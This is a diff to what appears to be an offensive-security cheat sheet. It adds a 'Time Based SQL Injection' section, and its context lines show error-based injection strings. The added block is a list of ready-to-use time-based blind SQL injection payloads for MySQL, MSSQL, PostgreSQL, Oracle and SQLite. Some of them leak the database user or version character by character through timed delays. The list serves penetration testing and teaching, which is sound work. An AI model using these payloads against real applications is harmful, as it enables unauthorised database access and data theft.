@@ -48,6 +48,7 @@
   * [Union based SQL Injection](#Union-based-sql-injection)
   * [Blind SQL Injection](#Blind-SQL-Injection)
   * [Error based SQL Injection](#error-based-sql-injection)
+  * [Time based SQL Injection](#Time-based-sql-injection)
   * [Filter bypass](#filter-bypass)
   * [SqlMap](#SqlMap)
 * [Dumb Shell to Fully Interactive Shell](#dumb-shell-to-fully-interactive-shell)
@@ -582,6 +583,32 @@ if (@@VERSION)=9 select 1 else select 2;
 ' AND 1=CONVERT(int, DB_NAME()) -- -
 ' AND 1=CONVERT(int,(SELECT STRING_AGG(name, ',') FROM sysobjects WHERE xtype='U'))-- -
 ~~~
+
+
+
+## Time Based SQL Injection
+
+~~~ sql
+-- MySQL
+' OR IF(1=1, SLEEP(5), 0)--+
+' AND IF(ASCII(SUBSTRING(user(),1,1))=114, SLEEP(5), 0)--+
+
+-- MSSQL
+' IF (1=1) WAITFOR DELAY '0:0:5'--
+' IF (ASCII(SUBSTRING(@@version,1,1))=77) WAITFOR DELAY '0:0:5'--
+
+-- PostgreSQL
+' OR pg_sleep(5)--
+' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+
+-- Oracle
+' OR 1=1 AND dbms_pipe.receive_message('a',5) IS NULL--
+' AND CASE WHEN (1=1) THEN dbms_pipe.receive_message('a',5) ELSE NULL END IS NULL--
+
+-- SQLite
+SELECT CASE WHEN (1=1) THEN randomblob(1000000000) ELSE 1 END--
+~~~
+
 
 ## Filter bypass
 
